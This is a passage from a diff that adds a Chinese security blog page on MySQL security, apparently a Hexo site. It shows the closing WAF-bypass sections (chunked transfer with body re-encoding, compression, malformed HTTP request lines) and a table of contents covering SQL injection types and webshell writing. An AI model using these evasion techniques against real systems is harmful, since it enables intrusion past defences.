+<h5 id="结合分块传输和change-body-encoding"><a href="#结合分块传输和change-body-encoding" class="headerlink" title="结合分块传输和change body encoding"></a><strong>结合分块传输和change body encoding</strong></h5><p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319182938912.png" alt="image-20210319182938912"></p>
+<h5 id="压缩协议绕过"><a href="#压缩协议绕过" class="headerlink" title="压缩协议绕过"></a><strong>压缩协议绕过</strong></h5><p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319202515804.png" alt="image-20210319202515804"></p>
+<h5 id="畸形请求头"><a href="#畸形请求头" class="headerlink" title="畸形请求头"></a><strong>畸形请求头</strong></h5><p>只要保证<code>HTTP</code>和<code>1.1</code>之间的<code>/</code>存在，可以任意修改<code>HTTP</code>和<code>1.1</code></p>
+<p><img src="C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210319183435268.png" alt="image-20210319183435268"></p>
+
+        </div>
+        
+<blockquote class="copyright">
+    <p><strong>Link to this article : </strong><a class="permalink" href="http://example.com/2021/03/23/Mysql%E5%AE%89%E5%85%A8/">http://example.com/2021/03/23/Mysql安全/</a></p>
+    <p><strong>This article is available under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a> License</strong></p>
+</blockquote>
+
+
+    </article>
+    
+    <section id="comments">
+        
+    </section>
+
+
+    
+
+</main>
+
+
+<aside style="" id="sidebar" class="aside aside-fixture">
+    <div class="toc-sidebar">
+        <nav id="toc" class="article-toc">
+            <h3 class="toc-title">Catalogue</h3>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">Mysql安全</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">Mysql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.1.1.</span> <span class="toc-text">万能密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.1.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">常用内置函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.1.4.</span> <span class="toc-text">注入类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">基于错误注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">布尔型注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.5.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.4.5.1.</span> <span class="toc-text">宽字节注入原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E5%AE%9E%E8%B7%B5"><span class="toc-number">1.1.4.5.2.</span> <span class="toc-text">宽字节注入实践</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E9%98%B2%E8%8C%83"><span class="toc-number">1.1.4.5.3.</span> <span class="toc-text">宽字节注入防范</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#order-by-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.6.</span> <span class="toc-text">order by 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.4.7.</span> <span class="toc-text">堆叠注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E9%97%AD%E5%90%88"><span class="toc-number">1.1.5.</span> <span class="toc-text">常见闭合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B6%88%E6%81%AF%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.6.</span> <span class="toc-text">消息头注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E7%89%B9%E6%AE%8A%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">PHP特殊函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#magic-quotes-gpc"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">magic_quotes_gpc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql-real-escape-string"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">mysql_real_escape_string</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#addslashes"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">addslashes</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mysql%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">1.3.</span> <span class="toc-text">Mysql写文件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8union-select-%E5%86%99%E5%85%A5"><span class="toc-number">1.3.0.0.1.</span> <span class="toc-text">利用union select 写入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#terminated%E5%86%99%E5%85%A5webshell"><span class="toc-number">1.3.0.0.2.</span> <span class="toc-text">terminated写入webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8log%E5%86%99%E5%85%A5"><span class="toc-number">1.3.0.0.3.</span> <span class="toc-text">利用log写入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">1.4.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.0.0.1.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.0.0.2.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.0.0.3.</span> <span class="toc-text">关键字绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">1.4.0.0.4.</span> <span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">1.4.0.0.5.</span> <span class="toc-text">参数污染</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%9A%E4%B8%AAPOST%E8%AF%B7%E6%B1%82%E5%8C%85%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.0.0.6.</span> <span class="toc-text">多个POST请求包绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93"><span class="toc-number">1.4.0.0.7.</span> <span class="toc-text">分块传输</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Burpsuite%E4%B8%AD%E7%9A%84Change-body-encoding"><span class="toc-number">1.4.0.0.8.</span> <span class="toc-text">Burpsuite中的Change body encoding</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%93%E5%90%88%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E5%92%8Cchange-body-encoding"><span class="toc-number">1.4.0.0.9.</span> <span class="toc-text">结合分块传输和change body encoding</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8E%8B%E7%BC%A9%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.0.0.10.</span> <span class="toc-text">压缩协议绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%95%B8%E5%BD%A2%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="toc-number">1.4.0.0.11.</span> <span class="toc-text">畸形请求头</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+        </nav>
+    </div>
+</aside>
+
+
+
+
+
+        </section>
+        <footer class="hidden lg:block fixed bottom-0 left-0 sm:w-1/12 lg:w-1/6 bg-gray-100 z-40">
+    
+    <div class="footer-social-links">
+        
+            <a target="_blank" rel="noopener" href="https://github.com/h00ls">
+                <i class="iconfont icon-github"></i>
+            </a>
+        
+            <a href="/atom.xml">
+                <i class="iconfont icon-rss"></i>
+            </a>
+        
+    </div>
+    
+    
+</footer>
+
+        <div id="mask" class="hidden mask fixed inset-0 bg-gray-900 opacity-75 z-40"></div>
+        <div id="search-view-container" class="hidden shadow-xl"></div>
+        
+<script src="/js/dom-event.min.js"></script>
+
+<script src="//cdn.jsdelivr.net/npm/yox@1.0.0-alpha.121/dist/standard/prod/yox.min.js"></script>
+
+
+<script src="/js/search.min.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/lightgallery.js@1.1.3/dist/js/lightgallery.min.js"></script>
+    
+<script src="/js/light-gallery.min.js"></script>
+
+
+
+
+
+    </body>
+</html>
